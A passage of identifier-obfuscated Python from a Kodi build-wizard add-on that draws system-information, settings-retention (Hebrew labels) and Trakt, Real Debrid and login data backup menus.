	O0O0O0000OO00OO00 =wiz .convertSize (int (float (O00000O00OO000000 [13 ][:-2 ]))*1024 *1024 )#line:2748
	OOOO0O0O0000OO000 ,O0OOO0O0O000OO0OO ,OO0O0O00OO00000OO =getIP ()#line:2749
	O0OOOO0O00OOO00OO =[];OOO000O0O00OOOOO0 =[];OO000OOOOOOOO00OO =[];O0OO00O0OO00O0OO0 =[];OO00OO00OO0OOO00O =[];OOOO00OOO0000O0O0 =[];OOO00O0OOOOOO000O =[]#line:2751
	O0OOOO00OO000OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2753
	for OOO0000000OOO0OOO in sorted (O0OOOO00OO000OO0O ,key =lambda OOOO000OO0OOOO00O :OOOO000OO0OOOO00O ):#line:2754
		O0O0OO00O00O0OOOO =os .path .split (OOO0000000OOO0OOO [:-1 ])[1 ]#line:2755
		if O0O0OO00O00O0OOOO =='packages':continue #line:2756
		OOO000O00OO0O0O0O =os .path .join (OOO0000000OOO0OOO ,'addon.xml')#line:2757
		if os .path .exists (OOO000O00OO0O0O0O ):#line:2758
			OO0OOOOO0O00OOO0O =open (OOO000O00OO0O0O0O )#line:2759
			O0O0OO0O0O0O0O0O0 =OO0OOOOO0O00OOO0O .read ()#line:2760
			O0OO000OO0OO00000 =re .compile ("<provides>(.+?)</provides>").findall (O0O0OO0O0O0O0O0O0 )#line:2761
			if len (O0OO000OO0OO00000 )==0 :#line:2762
				if O0O0OO00O00O0OOOO .startswith ('skin'):OOO00O0OOOOOO000O .append (O0O0OO00O00O0OOOO )#line:2763
				if O0O0OO00O00O0OOOO .startswith ('repo'):OO00OO00OO0OOO00O .append (O0O0OO00O00O0OOOO )#line:2764
				else :OOOO00OOO0000O0O0 .append (O0O0OO00O00O0OOOO )#line:2765
			elif not (O0OO000OO0OO00000 [0 ]).find ('executable')==-1 :O0OO00O0OO00O0OO0 .append (O0O0OO00O00O0OOOO )#line:2766
			elif not (O0OO000OO0OO00000 [0 ]).find ('video')==-1 :OO000OOOOOOOO00OO .append (O0O0OO00O00O0OOOO )#line:2767
			elif not (O0OO000OO0OO00000 [0 ]).find ('audio')==-1 :OOO000O0O00OOOOO0 .append (O0O0OO00O00O0OOOO )#line:2768
			elif not (O0OO000OO0OO00000 [0 ]).find ('image')==-1 :O0OOOO0O00OOO00OO .append (O0O0OO00O00O0OOOO )#line:2769
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2771
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2772
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2773
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2774
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2775
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2776
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2778
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2779
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2780
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2782
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00OOOOO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2783
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0O0O0OOO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2784
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OOOOOOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2785
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2787
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO0OO0O0O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2788
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOO000O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2789
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0000OO00OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2790
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2792
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2793
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0O0000OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2794
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0O000OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2795
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O00OO00000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2796
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00OO000000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2797
	OO00O000OO00O0O00 =len (O0OOOO0O00OOO00OO )+len (OOO000O0O00OOOOO0 )+len (OO000OOOOOOOO00OO )+len (O0OO00O0OO00O0OO0 )+len (OOOO00OOO0000O0O0 )+len (OOO00O0OOOOOO000O )+len (OO00OO00OO0OOO00O )#line:2799
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00O000OO00O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2800
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000OOOOOOOO00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2801
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO00O0OO00O0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2802
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000O0O00OOOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO0O00OOO00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OO00OO0OOO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2805
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00O0OOOOOO000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2806
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO00OOO0000O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2807
def Menu ():#line:2808
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2809
def saveMenu ():#line:2811
	OO0O00000OO00OO00 ='[COLOR green]מופעל[/COLOR]';OOO0OOOO00000OOO0 ='[COLOR red]מבוטל[/COLOR]'#line:2813
	O0OO0O0OOO00O0O00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2814
	O0O0O0O0OO0O00O0O ='true'if KEEPMOVIELIST =='true'else 'false'#line:2815
	O0OO000O0O0OO0000 ='true'if KEEPINFO =='true'else 'false'#line:2816
	O00OO0OO000OOO00O ='true'if KEEPSOUND =='true'else 'false'#line:2818
	O00OO0O0O00OOO0O0 ='true'if KEEPVIEW =='true'else 'false'#line:2819
	O00O0O0OO0O0O000O ='true'if KEEPSKIN =='true'else 'false'#line:2820
	OO00OO00OO0O00000 ='true'if KEEPSKIN2 =='true'else 'false'#line:2821
	OOOOOO0O0O00OOO0O ='true'if KEEPSKIN3 =='true'else 'false'#line:2822
	O0O0OOOOOOO00OOOO ='true'if KEEPADDONS =='true'else 'false'#line:2823
	O00O0OO0O00O000OO ='true'if KEEPPVR =='true'else 'false'#line:2824
	O0OO0OOO00O00OOO0 ='true'if KEEPTVLIST =='true'else 'false'#line:2825
	OOO00OO00O0O0OO00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2826
	O000OO0O0OOOOO000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2827
	O0000O000O000000O ='true'if KEEPHUBTV =='true'else 'false'#line:2828
	OOO00000OO0OOO0OO ='true'if KEEPHUBVOD =='true'else 'false'#line:2829
	O0OO0OOOOO00O00OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2830
	OOOOOO0O0OOO0OOOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2831
	O0O0OOO0OOO00OOOO ='true'if KEEPHUBMENU =='true'else 'false'#line:2832
	O00000OO000OOOO00 ='true'if KEEPPLAYLIST =='true'else 'false'#line:2833
	O0OO0O0O0000O00OO ='true'if KEEPTRAKT =='true'else 'false'#line:2834
	O0OO0O0O0O00O00O0 ='true'if KEEPREAL =='true'else 'false'#line:2835
	OOO00000OO000OOO0 ='true'if KEEPRD2 =='true'else 'false'#line:2836
	OO000000000OOO0OO ='true'if KEEPTORNET =='true'else 'true'#line:2837
	O00O0OOO00000OOOO ='true'if KEEPLOGIN =='true'else 'false'#line:2838
	OO000OO0OOO0OO000 ='true'if KEEPSOURCES =='true'else 'false'#line:2839
	O00O0000O000000O0 ='true'if KEEPADVANCED =='true'else 'false'#line:2840
	O0O00O000OOO0OO00 ='true'if KEEPPROFILES =='true'else 'false'#line:2841
	O00OOO00O000000O0 ='true'if KEEPFAVS =='true'else 'false'#line:2842
	O000O00O0OOOOOO00 ='true'if KEEPREPOS =='true'else 'false'#line:2843
	O0O0O00O00O00OO0O ='true'if KEEPSUPER =='true'else 'false'#line:2844
	O00000OOOO00OOOO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:2845
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2849
	if O00000OOOO00OOOO0 =='true':#line:2850
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2851
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2852
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2853
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2854
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2855
	addFile ('%s התקנת קיר סרטים: '%O0OO0O0OOO00O0O00 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2857
	addFile ('%s שמירת חשבון RD: '%O0OO0O0O0O00O00O0 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2858
	addFile ('%s שמירת חשבון טראקט: '%O0OO0O0O0000O00OO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2859
	addFile ('%s שמירת מועדפים: '%O00OOO00O000000O0 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2862
	addFile ('%s שמירת לקוח טלוויזיה: '%O00O0OO0O00O000OO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2863
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%O0OO0OOO00O00OOO0 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2864
	addFile ('%s שמירת אריח סרטים: '%OOO00OO00O0O0OO00 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2865
	addFile ('%s שמירת אריח סדרות: '%O000OO0O0OOOOO000 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2866
	addFile ('%s שמירת אריח טלויזיה: '%O0000O000O000000O .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2867
	addFile ('%s שמירת אריח תוכן ישראלי: '%OOO00000OO0OOO0OO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2868
	addFile ('%s שמירת אריח ילדים: '%O0OO0OOOOO00O00OO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2869
	addFile ('%s שמירת אריח מוסיקה: '%OOOOOO0O0OOO0OOOO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2870
	addFile ('%s שמירת תפריט אריחים ראשי: '%O0O0OOO0OOO00OOOO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2871
	addFile ('%s שמירת כל האריחים בסקין: '%O00O0O0OO0O0O000O .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2872
	addFile ('%s שמירת הרחבות שהתקנתי: '%O0O0OOOOOOO00OOOO .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2879
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%O0OO000O0O0OO0000 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2880
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O0O0O0O0OO0O00O0O .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת מקורות וידאו: '%OO000OO0OOO0OO000 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2884
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%O00OO0OO000OOO00O .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2885
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O00OO0O0O00OOO0O0 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2887
	addFile ('%s שמירת פליליסט לאודר: '%O00000OO000OOOO00 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת הרחבות ידנית: '%O00000OOOO00OOOO0 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת הגדרות באפר: '%O00O0000O000000O0 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת סופר מועדפים: '%O0O0O00O00O00OO0O .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2894
	addFile ('%s שמירת רשימות ריפו: '%O000O00O0OOOOOO00 .replace ('true',OO0O00000OO00OO00 ).replace ('false',OOO0OOOO00000OOO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2895
	setView ('files','viewType')#line:2897
def traktMenu ():#line:2899
	OO0OO0O0O0OO0O00O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2900
	OOO0O0O0OO00OO00O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2901
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2902
	addFile ('Save Trakt Data: %s'%OO0OO0O0O0OO0O00O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2903
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOO0O0O0OO00OO00O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2904
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2905
	for OO0OO0O0O0OO0O00O in traktit .ORDER :#line:2907
		O0O00O000O0000O0O =TRAKTID [OO0OO0O0O0OO0O00O ]['name']#line:2908
		OO00OO0000O0O0O0O =TRAKTID [OO0OO0O0O0OO0O00O ]['path']#line:2909
		OOOO0OOO000O0O0OO =TRAKTID [OO0OO0O0O0OO0O00O ]['saved']#line:2910
		OOOO0OOO000O00000 =TRAKTID [OO0OO0O0O0OO0O00O ]['file']#line:2911
		OOO000OO0O0OOOO0O =wiz .getS (OOOO0OOO000O0O0OO )#line:2912
		OOO0OO00OO0O0OO00 =traktit .traktUser (OO0OO0O0O0OO0O00O )#line:2913
		O00O0000O0OO00O00 =TRAKTID [OO0OO0O0O0OO0O00O ]['icon']if os .path .exists (OO00OO0000O0O0O0O )else ICONTRAKT #line:2914
		O0O0OOOO0OO00O000 =TRAKTID [OO0OO0O0O0OO0O00O ]['fanart']if os .path .exists (OO00OO0000O0O0O0O )else FANART #line:2915
		OOOO00O0OOOOOO000 =createMenu ('saveaddon','Trakt',OO0OO0O0O0OO0O00O )#line:2916
		OO0O00OO0000O0OOO =createMenu ('save','Trakt',OO0OO0O0O0OO0O00O )#line:2917
		OOOO00O0OOOOOO000 .append ((THEME2 %'%s Settings'%O0O00O000O0000O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0OO0O0O0OO0O00O )))#line:2918
		addFile ('[+]-> %s'%O0O00O000O0000O0O ,'',icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,themeit =THEME3 )#line:2920
		if not os .path .exists (OO00OO0000O0O0O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,menu =OOOO00O0OOOOOO000 )#line:2921
		elif not OOO0OO00OO0O0OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0OO0O0O0OO0O00O ,icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,menu =OOOO00O0OOOOOO000 )#line:2922
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0OO00OO0O0OO00 ,'authtrakt',OO0OO0O0O0OO0O00O ,icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,menu =OOOO00O0OOOOOO000 )#line:2923
		if OOO000OO0O0OOOO0O =="":#line:2924
			if os .path .exists (OOOO0OOO000O00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0OO0O0O0OO0O00O ,icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,menu =OO0O00OO0000O0OOO )#line:2925
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0OO0O0O0OO0O00O ,icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,menu =OO0O00OO0000O0OOO )#line:2926
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000OO0O0OOOO0O ,'',icon =O00O0000O0OO00O00 ,fanart =O0O0OOOO0OO00O000 ,menu =OO0O00OO0000O0OOO )#line:2927
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2929
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2930
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2931
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2932
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2933
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2934
	setView ('files','viewType')#line:2935
def realMenu ():#line:2937
	OO00000O0OOO0OOOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2938
	OO0000O0O0O00OO00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2939
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2940
	addFile ('Save Real Debrid Data: %s'%OO00000O0OOO0OOOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2941
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO0000O0O0O00OO00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2942
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2943
	for O00O00OOO0000OOOO in debridit .ORDER :#line:2945
		OO0OOOOO00000O0O0 =DEBRIDID [O00O00OOO0000OOOO ]['name']#line:2946
		OO0OOOO00O0O000OO =DEBRIDID [O00O00OOO0000OOOO ]['path']#line:2947
		OO0O0OOO0O0O000O0 =DEBRIDID [O00O00OOO0000OOOO ]['saved']#line:2948
		OO000000OOO000O00 =DEBRIDID [O00O00OOO0000OOOO ]['file']#line:2949
		O0O000OO00OOOO00O =wiz .getS (OO0O0OOO0O0O000O0 )#line:2950
		O0O0OOO0OOOOO0O00 =debridit .debridUser (O00O00OOO0000OOOO )#line:2951
		O000O000OO0OOOO00 =DEBRIDID [O00O00OOO0000OOOO ]['icon']if os .path .exists (OO0OOOO00O0O000OO )else ICONREAL #line:2952
		O0OO0O0OO00O00OOO =DEBRIDID [O00O00OOO0000OOOO ]['fanart']if os .path .exists (OO0OOOO00O0O000OO )else FANART #line:2953
		O00O0O0OOO0O000O0 =createMenu ('saveaddon','Debrid',O00O00OOO0000OOOO )#line:2954
		O0O0O0O0O00OO0O00 =createMenu ('save','Debrid',O00O00OOO0000OOOO )#line:2955
		O00O0O0OOO0O000O0 .append ((THEME2 %'%s Settings'%OO0OOOOO00000O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00O00OOO0000OOOO )))#line:2956
		addFile ('[+]-> %s'%OO0OOOOO00000O0O0 ,'',icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,themeit =THEME3 )#line:2958
		if not os .path .exists (OO0OOOO00O0O000OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,menu =O00O0O0OOO0O000O0 )#line:2959
		elif not O0O0OOO0OOOOO0O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00O00OOO0000OOOO ,icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,menu =O00O0O0OOO0O000O0 )#line:2960
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0OOO0OOOOO0O00 ,'authdebrid',O00O00OOO0000OOOO ,icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,menu =O00O0O0OOO0O000O0 )#line:2961
		if O0O000OO00OOOO00O =="":#line:2962
			if os .path .exists (OO000000OOO000O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00O00OOO0000OOOO ,icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,menu =O0O0O0O0O00OO0O00 )#line:2963
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00O00OOO0000OOOO ,icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,menu =O0O0O0O0O00OO0O00 )#line:2964
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O000OO00OOOO00O ,'',icon =O000O000OO0OOOO00 ,fanart =O0OO0O0OO00O00OOO ,menu =O0O0O0O0O00OO0O00 )#line:2965
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2967
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2968
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2969
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2970
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2971
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2972
	setView ('files','viewType')#line:2973
def loginMenu ():#line:2975
	OOOO0O00OOOO0OO0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2976
	OOO000O0O0O0OO0OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2977
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2978
	addFile ('Save Login Data: %s'%OOOO0O00OOOO0OO0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2979
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO000O0O0O0OO0OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2980
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2981
	for OOOO0O00OOOO0OO0O in loginit .ORDER :#line:2983
		O0OO0OO0O0O00OOOO =LOGINID [OOOO0O00OOOO0OO0O ]['name']#line:2984
		O0OOOOOO000O0O000 =LOGINID [OOOO0O00OOOO0OO0O ]['path']#line:2985
		O0OOO0OOO0OO00OO0 =LOGINID [OOOO0O00OOOO0OO0O ]['saved']#line:2986
		O0O000OO000O0000O =LOGINID [OOOO0O00OOOO0OO0O ]['file']#line:2987
		OO0O0OOOOOO0O00OO =wiz .getS (O0OOO0OOO0OO00OO0 )#line:2988
		OOOOO00O0OO000O0O =loginit .loginUser (OOOO0O00OOOO0OO0O )#line:2989
